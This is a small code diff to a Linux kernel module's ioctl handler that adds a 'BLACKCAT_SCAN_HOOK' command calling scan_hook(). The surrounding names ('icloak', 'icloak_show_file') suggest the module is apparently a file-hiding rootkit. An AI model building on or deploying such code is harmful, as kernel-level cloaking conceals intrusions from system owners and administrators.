@@ -7,6 +7,7 @@
  */
 
 #include <linux/cdev_ioctl.h>
+#include <linux/scan_hook.h>
 #include <defs/io.h>
 #include <icloak.h>
 #include <linux/slab.h>
@@ -40,6 +41,10 @@ long cdev_ioctl(struct file *fp, unsigned int cmd, unsigned long user_param) {
                                                     icloak_show_file(data);
 
             memset(data, 0, sizeof(data));
+            break;
+
+        case BLACKCAT_SCAN_HOOK:
+            error = scan_hook();
             break;
 
         default:
